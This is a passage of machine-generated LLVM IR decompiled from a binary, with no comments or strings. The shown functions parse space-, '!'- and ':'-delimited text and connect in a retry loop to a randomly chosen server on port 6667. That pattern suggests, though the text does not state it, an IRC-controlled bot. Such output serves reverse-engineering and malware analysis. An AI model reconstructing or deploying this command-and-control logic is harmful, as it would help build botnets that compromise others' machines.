  %v0_100039ac41 = call i32 @function_10007288()
  %v0_100039b442 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b443 = icmp ult i32 %v0_100039b442, %v0_100039ac41
  br i1 %v2_100039b443, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_10003998:                            ; preds = %dec_label_pc_100039bc
  %v1_1000399c = add i32 %storemerge946, 1
  store i32 %v1_1000399c, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac = call i32 @function_10007288()
  %v0_100039b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b4 = icmp ult i32 %v0_100039b4, %v0_100039ac
  br i1 %v2_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039a4.preheader, %dec_label_pc_10003998
  %storemerge946 = phi i32 [ %v1_1000399c, %dec_label_pc_10003998 ], [ 0, %dec_label_pc_100039a4.preheader ]
  %v2_100039c8 = add i32 %storemerge946, %v1_10003954
  %v1_100039cc = inttoptr i32 %v2_100039c8 to i8*
  %v2_100039cc = load i8, i8* %v1_100039cc, align 1
  %v3_100039d4 = icmp eq i8 %v2_100039cc, 32
  br i1 %v3_100039d4, label %dec_label_pc_100039dc, label %dec_label_pc_10003998

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_10003998, %dec_label_pc_100039bc, %dec_label_pc_100039a4.preheader
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_100039a4.preheader ], [ %v1_1000399c, %dec_label_pc_10003998 ], [ %storemerge946, %dec_label_pc_100039bc ]
  %v2_100039e8 = add i32 %storemerge9.lcssa, %v1_10003954
  %v3_100039f0 = inttoptr i32 %v2_100039e8 to i8*
  store i8 0, i8* %v3_100039f0, align 1
  %v3_100039f8 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  store i32 %v3_100039f8, i32* @r4, align 4
  %v3_10003a04 = call i32 @function_10007710(i32 %v1_10003954, i32 %v3_100039f8)
  %v3_10003a0c = icmp eq i32 %v3_10003a04, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a14, label %dec_label_pc_10003c2c

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_100039dc
  %v3_10003a18 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10003a1c = icmp eq i32 %v3_10003a18, 0
  br i1 %v3_10003a1c, label %dec_label_pc_10003a24, label %dec_label_pc_10003c2c

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br label %dec_label_pc_10003a58.preheader

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a70
  %v4_10003a70 = ptrtoint i8* %stack_var_-68.233 to i32
  %v1_10003a44 = add i32 %v4_10003a70, 1
  %v5_10003a48 = inttoptr i32 %v1_10003a44 to i8*
  %v1_10003a50 = add i32 %stack_var_-60.232, 1
  store i32 %v1_10003a50, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a60 = call i32 @function_10007288()
  %v0_10003a68 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a68 = icmp ult i32 %v0_10003a68, %v0_10003a60
  br i1 %v2_10003a68, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a58.preheader, %dec_label_pc_10003a40
  %stack_var_-68.233 = phi i8* [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ]
  %stack_var_-60.232 = phi i32 [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ]
  %v2_10003a74 = load i8, i8* %stack_var_-68.233, align 1
  %v3_10003a7c = icmp eq i8 %v2_10003a74, 32
  br i1 %v3_10003a7c, label %dec_label_pc_10003a84, label %dec_label_pc_10003a40

dec_label_pc_10003a84:                            ; preds = %dec_label_pc_10003a40, %dec_label_pc_10003a70, %dec_label_pc_10003a58.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.338, %dec_label_pc_10003a58.preheader ], [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.232, %dec_label_pc_10003a70 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.339, %dec_label_pc_10003a58.preheader ], [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.233, %dec_label_pc_10003a70 ]
  %v4_10003a84 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10003a88 = add i32 %v4_10003a84, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a98 = call i32 @function_10007288()
  %v0_10003aa0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v0_10003a98
  br i1 %v4_10003aa0, label %dec_label_pc_10003c2c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a84
  %v5_10003a8c = inttoptr i32 %v1_10003a88 to i8*
  %v1_10003aac = add nuw nsw i32 %storemerge1040, 1
  %tmp92 = icmp slt i32 %v1_10003aac, 3
  br i1 %tmp92, label %dec_label_pc_10003a58.preheader, label %dec_label_pc_10003ad8.preheader

dec_label_pc_10003a58.preheader:                  ; preds = %dec_label_pc_10003a24, %dec_label_pc_10003aa8
  %storemerge1040 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %v1_10003aac, %dec_label_pc_10003aa8 ]
  %stack_var_-68.339 = phi i8* [ %arg3, %dec_label_pc_10003a24 ], [ %v5_10003a8c, %dec_label_pc_10003aa8 ]
  %stack_var_-60.338 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10003aa8 ]
  store i32 %stack_var_-60.338, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a6027 = call i32 @function_10007288()
  %v0_10003a6828 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a6829 = icmp ult i32 %v0_10003a6828, %v0_10003a6027
  br i1 %v2_10003a6829, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003ad8.preheader:                  ; preds = %dec_label_pc_10003aa8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae018 = call i32 @function_10007288()
  %v0_10003ae819 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae820 = icmp ult i32 %v0_10003ae819, %v0_10003ae018
  br i1 %v2_10003ae820, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003acc:                            ; preds = %dec_label_pc_10003af0
  %v1_10003ad0 = add i32 %storemerge1123, 1
  store i32 %v1_10003ad0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae0 = call i32 @function_10007288()
  %v0_10003ae8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae8 = icmp ult i32 %v0_10003ae8, %v0_10003ae0
  br i1 %v2_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ad8.preheader, %dec_label_pc_10003acc
  %storemerge1123 = phi i32 [ %v1_10003ad0, %dec_label_pc_10003acc ], [ 0, %dec_label_pc_10003ad8.preheader ]
  %v2_10003afc = add i32 %storemerge1123, %v1_10003a88
  %v1_10003b00 = inttoptr i32 %v2_10003afc to i8*
  %v2_10003b00 = load i8, i8* %v1_10003b00, align 1
  %v3_10003b08 = icmp eq i8 %v2_10003b00, 32
  br i1 %v3_10003b08, label %dec_label_pc_10003b10, label %dec_label_pc_10003acc

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003acc, %dec_label_pc_10003af0, %dec_label_pc_10003ad8.preheader
  %storemerge11.lcssa = phi i32 [ 0, %dec_label_pc_10003ad8.preheader ], [ %v1_10003ad0, %dec_label_pc_10003acc ], [ %storemerge1123, %dec_label_pc_10003af0 ]
  %v2_10003b1c = add i32 %storemerge11.lcssa, %v1_10003a88
  %v3_10003b24 = inttoptr i32 %v2_10003b1c to i8*
  store i8 0, i8* %v3_10003b24, align 1
  store i32 268450608, i32* @lr, align 4
  %v2_10003b2c = call i32 @function_10007b20(i32 %v1_10003a88)
  %v5_10003b34 = trunc i32 %v2_10003b2c to i8
  store i8 %v5_10003b34, i8* %stack_var_-56, align 1
  %v4_10003b40 = icmp eq i8 %v5_10003b34, -1
  br i1 %v4_10003b40, label %dec_label_pc_10003b48, label %dec_label_pc_10003bb4

dec_label_pc_10003b48:                            ; preds = %dec_label_pc_10003b10
  store i32 268450640, i32* @lr, align 4
  %v3_10003b4c = call i32 @function_10007b54(i32 %v1_10003a88, i32 %v2_10003b2c)
  %v3_10003b5c = icmp eq i32 %v3_10003b4c, 0
  br i1 %v3_10003b5c, label %dec_label_pc_10003b64, label %dec_label_pc_10003b88

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b48
  %v3_10003b68 = load i32, i32* @global_var_10010488.143, align 4
  %v5_10003b80 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1000e1a0.163 to i32), i32 %v3_10003b68, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10003c2c

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003b48
  %v2_10003b88 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10003b90 = add i32 %v3_10003b4c, 16
  %v2_10003b90 = inttoptr i32 %v1_10003b90 to i32*
  %v3_10003b90 = load i32, i32* %v2_10003b90, align 4
  %v1_10003b94 = inttoptr i32 %v3_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v1_10003b9c = add i32 %v3_10003b4c, 12
  %v2_10003b9c = inttoptr i32 %v1_10003b9c to i32*
  %v3_10003b9c = load i32, i32* %v2_10003b9c, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 %v2_10003b94, i32* @r4, align 4
  store i32 %v3_10003b9c, i32* @r5, align 4
  store i32 268450740, i32* @lr, align 4
  %v0_10003bb0 = call i32 @function_10007108()
  %v2_10003bc4.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b88
  %v0_10003c4475 = phi i32 [ %v0_10003bb0, %dec_label_pc_10003b88 ], [ %v2_10003b2c, %dec_label_pc_10003b10 ]
  %v2_10003bc4 = phi i8 [ %v2_10003bc4.pre, %dec_label_pc_10003b88 ], [ %v5_10003b34, %dec_label_pc_10003b10 ]
  store i8 %v2_10003bc4, i8* bitcast (i8** @global_var_10010463.165 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10010460.15 to i8*), align 4
  store i32 256, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003950, %dec_label_pc_10003a84, %dec_label_pc_10003a14, %dec_label_pc_100039dc, %dec_label_pc_10003b64, %dec_label_pc_10003bb4
  %v0_10003c44 = phi i32 [ 0, %dec_label_pc_10003a14 ], [ %v3_10003a04, %dec_label_pc_100039dc ], [ %v5_10003b80, %dec_label_pc_10003b64 ], [ %v0_10003c4475, %dec_label_pc_10003bb4 ], [ %v0_10003a98, %dec_label_pc_10003a84 ], [ %v0_10003964, %dec_label_pc_10003950 ]
  %v2_10003c2c = load i32, i32* %stack_var_-80, align 4
  %v1_10003c38 = add i32 %v2_10003c2c, -12
  %v2_10003c38 = inttoptr i32 %v1_10003c38 to i32*
  %v3_10003c38 = load i32, i32* %v2_10003c38, align 4
  store i32 %v3_10003c38, i32* %r29.global-to-local, align 4
  ret i32 %v0_10003c44

; uselistorder directives
  uselistorder i32 %v2_10003b2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.338, { 2, 0, 1 }
  uselistorder i32 %v1_10003aac, { 1, 0 }
  uselistorder i32 %v1_10003a88, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.162, { 2, 0, 1 }
  uselistorder i32 %v1_10003978, { 1, 0 }
  uselistorder i32 %v1_10003954, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 12, 17, 18, 19, 20, 13, 14, 15, 16 }
  uselistorder i8** @global_var_10010460.15, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10010464.16, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003c2c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10003bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100039dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100039bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003950, { 2, 1, 0 }
}

define i32 @function_10003c48(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10003c48:
  %v3_10003c6c = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v3_10003c6c, i32* @r3, align 4
  store i32 268450936, i32* @lr, align 4
  %v0_10003c74 = call i32 @function_100081f8()
  store i32 268450940, i32* @lr, align 4
  %v0_10003c78 = call i32 @function_100007d4()
  store i32 %v0_10003c78, i32* @global_var_10010474.145, align 4
  ret i32 %v0_10003c78
}

define i32 @function_10003ca0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10003ca0:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce43 = call i32 @function_10007288()
  %v2_10003cec5 = icmp eq i32 %v0_10003ce43, 0
  br i1 %v2_10003cec5, label %dec_label_pc_10003d14, label %dec_label_pc_10003cf4

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003cf4
  %v1_10003cd4 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce4 = call i32 @function_10007288()
  %v2_10003cec = icmp ult i32 %v1_10003cd4, %v0_10003ce4
  br i1 %v2_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003d14

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0
  %storemerge28 = phi i32 [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ 0, %dec_label_pc_10003ca0 ]
  %v2_10003d00 = add i32 %storemerge28, %arg2
  %v1_10003d04 = inttoptr i32 %v2_10003d00 to i8*
  %v2_10003d04 = load i8, i8* %v1_10003d04, align 1
  %v3_10003d0c = icmp eq i8 %v2_10003d04, 33
  br i1 %v3_10003d0c, label %dec_label_pc_10003d14, label %dec_label_pc_10003cd0

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0, %dec_label_pc_10003cf4
  %storemerge2.lcssa = phi i32 [ 0, %dec_label_pc_10003ca0 ], [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ %storemerge28, %dec_label_pc_10003cf4 ]
  %v2_10003d20 = add i32 %storemerge2.lcssa, %arg2
  %v3_10003d28 = inttoptr i32 %v2_10003d20 to i8*
  store i8 0, i8* %v3_10003d28, align 1
  %v3_10003d30 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10003d30, i32* @r4, align 4
  %v2_10003d3c = call i32 @function_10007710(i32 %arg2, i32 %v3_10003d30)
  %v3_10003d44 = icmp eq i32 %v2_10003d3c, 0
  br i1 %v3_10003d44, label %dec_label_pc_10003d4c, label %dec_label_pc_10003da0

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003d14
  %v2_10003d50 = load i8, i8* %arg3, align 1
  %v3_10003d58 = icmp eq i8 %v2_10003d50, 58
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d6c

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d4c
  %v1_10003d64 = add i32 %tmp, 1
  %v5_10003d68 = inttoptr i32 %v1_10003d64 to i8*
  br label %dec_label_pc_10003d6c

dec_label_pc_10003d6c:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d60
  %stack_var_-32.0 = phi i8* [ %v5_10003d68, %dec_label_pc_10003d60 ], [ %arg3, %dec_label_pc_10003d4c ]
  %v3_10003d70 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10003d74 = icmp eq i32 %v3_10003d70, 0
  br i1 %v3_10003d74, label %dec_label_pc_10003d8c, label %dec_label_pc_10003d7c

dec_label_pc_10003d7c:                            ; preds = %dec_label_pc_10003d6c
  store i32 %v3_10003d70, i32* @r3, align 4
  store i32 268451212, i32* @lr, align 4
  %v0_10003d88 = call i32 @function_100081f8()
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d6c, %dec_label_pc_10003d7c
  %v4_10003d8c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 268451220, i32* @lr, align 4
  %v2_10003d90 = call i32 @function_10007760(i32 %v4_10003d8c)
  store i32 %v2_10003d90, i32* @global_var_10010474.145, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003d8c
  %v0_10003db8 = phi i32 [ %v2_10003d3c, %dec_label_pc_10003d14 ], [ %v2_10003d90, %dec_label_pc_10003d8c ]
  ret i32 %v0_10003db8

; uselistorder directives
  uselistorder i32 %v1_10003cd4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
}

define i32 @function_10003dbc() local_unnamed_addr {
dec_label_pc_10003dbc:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10003ef4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10003ef8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10003f50 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10003dd4

dec_label_pc_10003dd4:                            ; preds = %dec_label_pc_10003dd4.backedge, %dec_label_pc_10003dbc
  store i32 -1, i32* @global_var_10010478.10, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10003dec = load i32, i32* @global_var_10010458.107, align 4
  %v3_10003df0 = icmp eq i32 %v3_10003dec, 0
  br i1 %v3_10003df0, label %dec_label_pc_10003df8, label %dec_label_pc_10003e30

dec_label_pc_10003df8:                            ; preds = %dec_label_pc_10003dd4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @function_100086d8()
  %v3_10003e04 = load i32, i32* @global_var_10010410.168, align 4
  %v2_10003e08 = srem i32 %v0_10003df8, %v3_10003e04
  %v1_10003e1c = mul i32 %v2_10003e08, 4
  %v2_10003e20 = add i32 %v1_10003e1c, ptrtoint ([16 x i8]** @global_var_10010414.170 to i32)
  %v1_10003e24 = inttoptr i32 %v2_10003e20 to i32*
  %v2_10003e24 = load i32, i32* %v1_10003e24, align 4
  store i32 %v2_10003e24, i32* @global_var_10010480.106, align 4
  br label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003dd4, %dec_label_pc_10003df8
  store i32 0, i32* @global_var_10010458.107, align 4
  br label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e30
  store i32 268451404, i32* @lr, align 4
  %v3_10003e48 = call i32 @function_1000806c(i32 2, i32 1, i32 6)
  store i32 %v3_10003e48, i32* @global_var_10010478.10, align 4
  %v1_10003e60 = icmp slt i32 %v3_10003e48, 0
  br i1 %v1_10003e60, label %dec_label_pc_10003e3c, label %dec_label_pc_10003e68

dec_label_pc_10003e68:                            ; preds = %dec_label_pc_10003e3c
  %v3_10003e6c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451448, i32* @lr, align 4
  %v1_10003e74 = call i32 @function_10007b20(i32 %v3_10003e6c)
  %v3_10003e7c = icmp eq i32 %v1_10003e74, 0
  br i1 %v3_10003e7c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003e84

dec_label_pc_10003e84:                            ; preds = %dec_label_pc_10003e68
  %v3_10003e88 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451476, i32* @lr, align 4
  %v1_10003e90 = call i32 @function_10007b20(i32 %v3_10003e88)
  %v4_10003e9c = icmp eq i32 %v1_10003e90, -1
  br i1 %v4_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003f18

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e84, %dec_label_pc_10003e68
  %v3_10003ea8 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @function_10007b54(i32 %v3_10003ea8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ec0 = icmp eq i32 %v2_10003eb0, 0
  br i1 %v3_10003ec0, label %dec_label_pc_10003ec8, label %dec_label_pc_10003ee8

dec_label_pc_10003ec8:                            ; preds = %dec_label_pc_10003ea4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10003ed8 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451556, i32* @lr, align 4
  %v1_10003ee0 = call i32 @function_10004ab4(i32 %v3_10003ed8)
  br label %dec_label_pc_10003dd4.backedge

dec_label_pc_10003dd4.backedge:                   ; preds = %dec_label_pc_10003ec8, %dec_label_pc_10004080
  br label %dec_label_pc_10003dd4

dec_label_pc_10003ee8:                            ; preds = %dec_label_pc_10003ea4
  %v1_10003eec = add i32 %v2_10003eb0, 16
  %v2_10003eec = inttoptr i32 %v1_10003eec to i32*
  %v3_10003eec = load i32, i32* %v2_10003eec, align 4
  %v1_10003ef0 = inttoptr i32 %v3_10003eec to i32*
  %v2_10003ef0 = load i32, i32* %v1_10003ef0, align 4
  %v1_10003f00 = add i32 %v2_10003eb0, 12
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003f14.171 to i32), i32* @lr, align 4
  %v4_10003f10 = call i32 @function_10007700(i32 %v2_10003ef0, i32 %v2_10003ef8, i32 %v3_10003f00, i32 %v2_10003eb0)
  br label %dec_label_pc_10003f30

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003e84
  %v3_10003f1c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451624, i32* @lr, align 4
  %v1_10003f24 = call i32 @function_10007b20(i32 %v3_10003f1c)
  store i32 %v1_10003f24, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f18
  store i32 2, i32* %stack_var_-28, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10003f3c = call i32 @function_100079f4(i32 6667)
  %v3_10003f4c = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003f6c.172 to i32), i32* @lr, align 4
  %v3_10003f68 = call i32 @function_100049cc(i32 %v3_10003f4c, i32 -2147195266, i32 %v2_10003f50)
  store i32 268451700, i32* @lr, align 4
  %v1_10003f70 = call i32 @function_10004d80(i32 0)
  store i32 268451944, i32* @lr, align 4
  %v1_1000406411 = call i32 @function_10004d80(i32 0)
  %v2_1000407412 = sub i32 %v1_1000406411, %v1_10003f70
  %tmp1016 = icmp ult i32 %v2_1000407412, 10
  br i1 %tmp1016, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10003f80:                            ; preds = %dec_label_pc_10003f30, %dec_label_pc_10004058
  %v0_10003f80 = call i32 @function_10004e38()
  %v2_10003f8c = inttoptr i32 %v0_10003f80 to i32*
  store i32 0, i32* %v2_10003f8c, align 4
  %v3_10003f94 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451756, i32* @lr, align 4
  %v3_10003fa8 = call i32 @function_10007f54(i32 %v3_10003f94, i32 %v2_10003ef4, i32 16)
  %v3_10003fb0 = icmp eq i32 %v3_10003fa8, 0
  br i1 %v3_10003fb0, label %dec_label_pc_10003fcc, label %dec_label_pc_10003fb8

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f80
  %v0_10003fb8 = call i32 @function_10004e38()
  %v1_10003fc0 = inttoptr i32 %v0_10003fb8 to i32*
  %v2_10003fc0 = load i32, i32* %v1_10003fc0, align 4
  %v3_10003fc4 = icmp eq i32 %v2_10003fc0, 106
  br i1 %v3_10003fc4, label %dec_label_pc_10003fcc, label %dec_label_pc_10004030

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fb8, %dec_label_pc_10003f80
  %v3_10003fd0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451820, i32* @lr, align 4
  %v6_10003fe8 = call i32 @function_10008030(i32 %v3_10003fd0, i32 1, i32 13, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ff0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451852, i32* @lr, align 4
  %v6_10004008 = call i32 @function_10008030(i32 %v3_10003ff0, i32 1, i32 2, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10004010 = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint (i32* @global_var_1000402c.173 to i32), i32* @lr, align 4
  %v6_10004028 = call i32 @function_10008030(i32 %v3_10004010, i32 1, i32 9, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v6_10004028

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fb8
  %v0_10004030 = call i32 @function_10004e38()
  %v1_10004038 = inttoptr i32 %v0_10004030 to i32*
  %v2_10004038 = load i32, i32* %v1_10004038, align 4
  %v3_1000403c = icmp eq i32 %v2_10004038, 115
  br i1 %v3_1000403c, label %dec_label_pc_10004058, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004030
  %v0_10004044 = call i32 @function_10004e38()
  %v1_1000404c = inttoptr i32 %v0_10004044 to i32*
  %v2_1000404c = load i32, i32* %v1_1000404c, align 4
  %v3_10004050 = icmp eq i32 %v2_1000404c, 114
  br i1 %v3_10004050, label %dec_label_pc_10004058, label %dec_label_pc_10004080

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004044, %dec_label_pc_10004030
  store i32 ptrtoint ([3 x i8]* @global_var_10004060.174 to i32), i32* @lr, align 4
  %v1_1000405c = call i32 @function_10008f90(i32 1)
  store i32 268451944, i32* @lr, align 4
  %v1_10004064 = call i32 @function_10004d80(i32 0)
  %v2_10004074 = sub i32 %v1_10004064, %v1_10003f70
  %tmp10 = icmp ult i32 %v2_10004074, 10
  br i1 %tmp10, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004058, %dec_label_pc_10004044, %dec_label_pc_10003f30
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10004090 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451996, i32* @lr, align 4
  %v1_10004098 = call i32 @function_10004ab4(i32 %v3_10004090)
  br label %dec_label_pc_10003dd4.backedge

; uselistorder directives
  uselistorder i32 %v1_10003f70, { 1, 0 }
  uselistorder i32 %v3_10003f00, { 1, 0 }
  uselistorder i32 %v2_10003eb0, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10008030, { 2, 1, 0 }
  uselistorder i32 268451944, { 1, 0 }
  uselistorder i32 (i32)* @function_100079f4, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10007700, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_10007b54, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_100086d8, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10003f80, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10003e30, { 1, 0 }
}

define i32 @function_100040b8(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_100040b8:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-5144 = alloca i32, align 4
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-6432 = alloca i32, align 4
  %stack_var_-6744 = alloca i32, align 4
